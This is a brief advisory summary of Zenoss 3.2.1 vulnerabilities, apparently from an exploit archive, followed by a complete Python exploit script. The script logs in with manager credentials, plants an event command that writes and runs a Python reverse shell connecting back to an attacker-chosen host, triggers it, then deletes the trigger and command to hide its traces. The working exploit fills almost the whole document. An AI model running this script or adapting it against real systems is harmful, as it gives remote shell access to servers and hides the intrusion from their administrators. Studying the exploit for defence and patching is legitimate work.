source: http://www.securityfocus.com/bid/54793/info

Zenoss is prone to the following security vulnerabilities:

1. Multiple arbitrary command-execution vulnerabilities
2. Multiple HTML-injection vulnerabilities
3. An open-redirection vulnerability
4. Multiple directory-traversal vulnerabilities
5. Multiple information-disclosure vulnerabilities
6. A code-execution vulnerability

An attacker can exploit these issues to retrieve arbitrary files, redirect a user to a potentially malicious site, execute arbitrary commands, execute HTML and script code in the context of the affected site, steal cookie-based authentication credentials to perform unauthorized actions in the context of a user's session, or disclose sensitive-information.

Zenoss 3.2.1 and prior are vulnerable.

# Zenoss <= 3.2.1 Remote Post-Authentication Command Execution #################
# o Requires:     Credentials for a user with "ZenManager" or "Manager" roles.
# o Tested:       Zenoss 3.2.1
# o Default port: 8080
# Brendan Coles <bcoles at gmail dot com> # 2012-03-14
################################################################################
import socket, sys, random, time, re
#verbose = True
verbose = False

# usage
if len(sys.argv) < 6:
	print "Zenoss <= 3.2.1 Remote Post-Authentication Command Execution"
	print "[*] Usage: python "+sys.argv[0]+" <RHOST> <RPORT> <username> <password> <LHOST> <LPORT>"
	print "[*] Example: python "+sys.argv[0]+" 192.168.1.10 8080 zenoss zenoss 192.168.1.1 4444"
	sys.exit(0)

# zenoss details
RHOST    = sys.argv[1]
RPORT    = int(sys.argv[2])
username = sys.argv[3]
password = sys.argv[4]

# reverse shell
LHOST    = sys.argv[5]
LPORT    = int(sys.argv[6])

# random file name
filename = ""
for i in range(0,random.randint(10,20)):
	filename = filename+chr(random.randint(97,122))

# connect to RHOST:RPORT
try:
	socket.inet_aton(RHOST)
except socket.error:
	print "[-] Error: Could not create socket."
	sys.exit(1)
try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((RHOST,RPORT))
except:
	print "[-] Error: Could not connect to server"
	sys.exit(1)


# Login and get cookie
if verbose: print "[*] Logging in"
request = "GET /zport/acl_users/cookieAuthHelper/login?__ac_name="+username+"&__ac_password="+password+" HTTP/1.1\r\nHost: "+RHOST+":"+str(RPORT)+"\r\n\r\n"
try:
	# send request
	s.sendto(request, (RHOST, RPORT))
	data = s.recv(1024)
	if verbose: print str(data)+"\r\n"
	# get ginger cookie
	m = re.search('(__ginger_snap=".+";)', data)
	if not m:
		raise Exception("[-] Error: Could not retrieve __ginger_snap cookie value")
	else:
		ginger_cookie = str(m.group(1))
except:
	print "[-] Error: Login failed"
	sys.exit(1)


# Add empty command to web interface
if verbose: print "[*] Adding command to Zenoss"
request = "GET /zport/dmd/ZenEventManager/commands/?id="+filename+"&manage_addCommand%3Amethod=+Add+&__ac_name="+username+"&__ac_password="+password+" HTTP/1.1\r\nHost: "+RHOST+":"+str(RPORT)+"\r\n\r\n"
try:
	# send request
	s.sendto(request, (RHOST, RPORT))
	data = s.recv(1024)
	if verbose: print str(data)+"\r\n"
	m = re.search('(Bobo-Exception-Type: Unauthorized)', data)
	if m: raise Exception("[-] Error: Incorrect username/password")
	else: print "[+] Added command to Zenoss successfully"
except:
	print "[-] Error: Adding command to Zenoss failed"
	sys.exit(1)


# Wait for command to be saved
wait = 5
if verbose: print "[*] Waiting "+str(wait)+" seconds"
time.sleep(wait)


# Edit command to drop a python reverse shell request in /tmp/
if verbose: print "[*] Updating command with payload"
postdata = "zenScreenName=editEventCommand.pt&enabled%3Aboolean=True&defaultTimeout%3Aint=60&delay%3Aint=1&repeatTime%3Aint=15&command=echo+%22import+socket%2Csubprocess%2Cos%3Bhost%3D%5C%22"+LHOST+"%5C%22%3Bport%3D"+str(LPORT)+"%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28host%2Cport%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3B+os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22%2Fbin%2Fsh%5C%22%2C%5C%22-i%5C%22%5D%29%3B%22+%3E+%2Ftmp%2F"+filename+".py%20%26%26%20chmod%20%2bx%20%2Ftmp%2F"+filename+".py%20%26%26%20python%20%2Ftmp%2F"+filename+".py&clearCommand=&add_filter=&manage_editEventCommand%3Amethod=+Save+"
request = "POST /zport/dmd/ZenEventManager/commands/"+filename+"?__ac_name="+username+"&__ac_password="+password+" HTTP/1.1\r\nHost: "+RHOST+":"+str(RPORT)+"\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "+str(len(postdata))+"\r\n\r\n"+postdata
try:
	# send request
	s.sendto(request, (RHOST, RPORT))
	data = s.recv(1024)
	if verbose: print str(data)+"\r\n"
	# get zope cookie
	m = re.search('(_ZopeId=".+";)', data)
	if not m: raise Exception("[-] Error: Could not retrieve _ZopeId cookie value")
	else:
		zope_cookie = str(m.group(1))
		print "[+] Sent payload successfully"
except:
	print "[-] Error: Sending payload failed"
	sys.exit(1)


# Wait for command to be saved
wait = 5
if verbose: print "[*] Waiting "+str(wait)+" seconds"
time.sleep(wait)


# Send trigger event and get event id
if verbose: print "[*] Sending trigger event"
postdata = '{"action":"EventsRouter","method":"add_event","data":[{"summary":"'+filename+'","device":"'+filename+'","component":"'+filename+'","severity":"Info","evclasskey":"","evclass":""}],"type":"rpc","tid":0}'
request = "POST /zport/dmd/Events/evconsole_router HTTP/1.1\r\nHost: "+RHOST+":"+str(RPORT)+'\r\nX-Requested-With: XMLHttpRequest\r\nCookie: '+ginger_cookie+' '+zope_cookie+'\r\nContent-Type: application/json; charset=UTF-8\r\nContent-Length: '+str(len(postdata))+'\r\n\r\n'+postdata
try:
	# send request
	s.sendto(request, (RHOST, RPORT))
	data = s.recv(1024)
	if verbose: print str(data)+"\r\n"
	# get trigger event id "evid"
	m = re.search('"evid": "(.+)"', data)
	evid = ""
	if not m: raise Exception("[-] Error: Sending trigger event failed")
	else:
		evid = str(m.group(1))
		print "[+] Sent trigger event successfully"
except:
	print "[-] Error: Sending trigger event failed"


# Wait for command to execute
wait = 60
if verbose: print "[*] Waiting "+str(wait)+" seconds"
time.sleep(wait)


# Delete trigger from web interface
if verbose: print "[*] Deleting the trigger"
postdata = '{"action":"EventsRouter","method":"close","data":[{"evids":["'+evid+'"],"excludeIds":{},"selectState":null,"field":"component","direction":"ASC","params":"{\\"severity\\":[5,4,3,2],\\"eventState\\":[0,1]}","asof":0}],"type":"rpc","tid":0}'
request = "POST /zport/dmd/Events/evconsole_router HTTP/1.1\r\nHost: "+RHOST+":"+str(RPORT)+'\r\nX-Requested-With: XMLHttpRequest\r\nCookie: '+ginger_cookie+' '+zope_cookie+'\r\nContent-Type: application/json; charset=UTF-8\r\nContent-Length: '+str(len(postdata))+'\r\n\r\n'+postdata
try:
	# send request
	s.sendto(request, (RHOST, RPORT))
	data = s.recv(1024)
	if verbose: print str(data)+"\r\n"
	print "[+] Deleted trigger successfully"
except:
	print "[-] Error: Deleting trigger failed"


# Delete command from web interface
if verbose: print "[*] Deleting the command from Zenoss"
request = "GET /zport/dmd/ZenEventManager?zenScreenName=listEventCommands&redirect=false&ids%3Alist="+filename+"&id=&manage_deleteCommands%3Amethod=Delete&__ac_name="+username+"&__ac_password="+password+" HTTP/1.1\r\nHost: "+RHOST+":"+str(RPORT)+"\r\n\r\n"
try:
	s.sendto(request, (RHOST, RPORT))
	data = s.recv(1024)
	if verbose: print str(data)+"\r\n"
	print "[+] Deleted command from Zenoss successfully"
except:
	print "[-] Error: Deleting command failed"

print "[+] You should now have a reverse shell at "+LHOST+":"+str(LPORT)
print "[+] Don't forget to delete /tmp/"+filename+".py"